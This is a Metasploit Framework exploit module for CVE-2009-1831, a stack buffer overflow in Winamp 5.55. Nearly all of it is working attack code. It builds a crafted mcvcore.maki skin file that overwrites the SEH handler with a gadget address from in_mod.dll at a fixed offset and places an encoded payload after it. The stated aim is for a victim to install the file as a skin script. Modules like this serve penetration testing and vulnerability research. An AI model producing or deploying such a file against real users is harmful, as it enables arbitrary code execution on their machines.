##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Winamp MAKI Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack based buffer overflow in Winamp 5.55. The flaw
				exists in the gen_ff.dll and occurs while parsing a specially crafted MAKI file,
				where memmove is used with in a insecure way with user controlled data.

				To exploit the vulnerability the attacker must convince the attacker to install the
				generated mcvcore.maki file in the "scripts" directory of the default "Bento" skin,
				or generate a new skin using the crafted mcvcore.maki file. The module has been
				tested successfully on Windows XP SP3 and Windows 7 SP1.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Monica Sojeong Hong', # Vulnerability Discovery
					'juan vazquez'	# Metasploit module
				],
			'References'     =>
				[
					[ 'CVE', '2009-1831'],
					[ 'OSVDB', '54902'],
					[ 'BID', '35052'],
					[ 'EDB', '8783'],
					[ 'EDB', '8772'],
					[ 'EDB', '8770'],
					[ 'EDB', '8767'],
					[ 'URL', 'http://vrt-sourcefire.blogspot.com/2009/05/winamp-maki-parsing-vulnerability.html' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'       => 4000,
					'DisableNops' => true,
					'BadChars'    => ""
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					# winamp.exe 5.5.5.2405
					[ 'Winamp 5.55 / Windows XP SP3 / Windows 7 SP1',
						{
							'Ret' => 0x12f02bc3, # ppr from in_mod.dll
							'Offset' => 16756
						}
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'May 20 2009',
			'DefaultTarget'  => 0))

		deregister_options('FILENAME')
	end

	def file_format_filename
		'mcvcore.maki'
	end

	def exploit

		sploit = rand_text(target['Offset'])
		sploit << generate_seh_record(target.ret)
		sploit << payload.encoded
		length_sploit = [sploit.length].pack("v")

		header = "\x46\x47" # magic
		header << "\x03\x04" # version
		header << "\x17\x00\x00\x00"
		types  = "\x01\x00\x00\x00" # count
		# class 1 => Object
		types << "\x71\x49\x65\x51\x87\x0D\x51\x4A\x91\xE3\xA6\xB5\x32\x35\xF3\xE7"
		# functions
		functions = "\x37\x00\x00\x00" # count
		#function 1
		functions << "\x01\x01" # class
		functions << "\x00\x00" # dummy
		functions << length_sploit # function name length
		functions << sploit # crafted function name

		maki = header
		maki << types
		maki << functions

		print_status("Creating '#{file_format_filename}' file ...")

		file_create(maki)

	end

end